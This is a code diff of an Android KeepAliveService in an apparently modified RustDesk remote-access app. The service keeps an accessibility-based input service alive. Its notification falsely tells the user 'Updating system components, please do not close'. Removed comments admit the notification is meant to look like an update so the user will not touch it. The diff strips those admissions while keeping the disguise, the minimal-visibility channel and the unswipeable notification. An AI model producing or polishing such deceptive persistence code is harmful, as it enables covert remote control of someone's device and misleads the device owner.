@@ -11,30 +11,25 @@ import android.os.Build
 import android.os.IBinder
 import android.util.Log
 
-/**
- * KeepAliveService — постоянный Foreground Service.
- *
- * Цель: держать процесс живым чтобы Android не убивал InputService (AccessibilityService).
- * Пока этот сервис жив — весь процесс защищён от Doze/battery optimization.
- *
- * Уведомление намеренно выглядит как "обновление" — пользователь не трогает.
- * Запускается из MainActivity.onCreate и BootReceiver.
- */
 class KeepAliveService : Service() {
 
     companion object {
         private const val TAG = "KeepAliveService"
-        private const val NOTIF_ID = 0xA11E  // уникальный ID не конфликтующий с MainService
+        private const val NOTIF_ID = 0xA11E
         private const val CHANNEL_ID = "rustdesk_keepalive"
 
         fun start(context: Context) {
             val intent = Intent(context, KeepAliveService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(intent)
-            } else {
-                context.startService(intent)
+            try {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    context.startForegroundService(intent)
+                } else {
+                    context.startService(intent)
+                }
+                Log.d(TAG, "start() called")
+            } catch (e: Exception) {
+                Log.e(TAG, "start() failed: ${e.message}")
             }
-            Log.d(TAG, "start() called")
         }
 
         fun stop(context: Context) {
@@ -44,34 +39,40 @@ class KeepAliveService : Service() {
 
     override fun onBind(intent: Intent?): IBinder? = null
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Log.d(TAG, "onStartCommand")
-        startForeground(NOTIF_ID, buildNotification())
-        return START_STICKY  // Android перезапустит если убьёт
-    }
-
     override fun onCreate() {
         super.onCreate()
-        createNotificationChannel()
         Log.d(TAG, "onCreate")
+        // Создаём канал и СРАЗУ вызываем startForeground в onCreate
+        // чтобы гарантированно уложиться в 5 секунд
+        createNotificationChannel()
+        try {
+            startForeground(NOTIF_ID, buildNotification())
+        } catch (e: Exception) {
+            Log.e(TAG, "startForeground in onCreate failed: ${e.message}")
+        }
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        Log.d(TAG, "onStartCommand")
+        // startForeground уже вызван в onCreate — здесь просто обновляем уведомление
+        try {
+            startForeground(NOTIF_ID, buildNotification())
+        } catch (e: Exception) {
+            Log.e(TAG, "startForeground in onStartCommand failed: ${e.message}")
+        }
+        return START_STICKY
     }
 
     override fun onDestroy() {
-        Log.w(TAG, "onDestroy — Android killed the service")
+        Log.w(TAG, "onDestroy")
         super.onDestroy()
     }
-
-    // -----------------------------------------------------------------------
-    // Notification
-    // -----------------------------------------------------------------------
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
                 "RustDesk Service",
-                // IMPORTANCE_MIN — нет звука, нет иконки в статус-баре,
-                // но foreground service всё равно работает
                 NotificationManager.IMPORTANCE_MIN
             ).apply {
                 setShowBadge(false)
@@ -79,39 +80,44 @@ class KeepAliveService : Service() {
                 enableVibration(false)
                 setSound(null, null)
             }
-            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-            nm.createNotificationChannel(channel)
+            try {
+                val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+                nm.createNotificationChannel(channel)
+            } catch (e: Exception) {
+                Log.e(TAG, "createNotificationChannel failed: ${e.message}")
+            }
         }
     }
 
     private fun buildNotification(): Notification {
-        // Тап по уведомлению открывает MainActivity
         val pendingIntent = PendingIntent.getActivity(
             this, 0,
             Intent(this, MainActivity::class.java),
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
         )
 
+        // Используем иконку приложения — гарантированно доступна на всех OEM
+        val iconRes = try {
+            packageManager.getApplicationInfo(packageName, 0).icon
+        } catch (_: Exception) {
+            android.R.drawable.ic_menu_info_details  // системная fallback иконка
+        }
+
         return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             Notification.Builder(this, CHANNEL_ID)
                 .setContentTitle("RustDesk")
                 .setContentText("Updating system components, please do not close...")
-                .setSmallIcon(android.R.drawable.stat_sys_download)
+                .setSmallIcon(iconRes)
                 .setContentIntent(pendingIntent)
-                .setOngoing(true)        // нельзя смахнуть
-                .setShowWhen(false)      // не показывать время
-                .setForegroundServiceBehavior(
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
-                        Notification.FOREGROUND_SERVICE_DEFAULT
-                    else 0
-                )
+                .setOngoing(true)
+                .setShowWhen(false)
                 .build()
         } else {
             @Suppress("DEPRECATION")
             Notification.Builder(this)
                 .setContentTitle("RustDesk")
                 .setContentText("Updating system components, please do not close...")
-                .setSmallIcon(android.R.drawable.stat_sys_download)
+                .setSmallIcon(iconRes)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
                 .build()
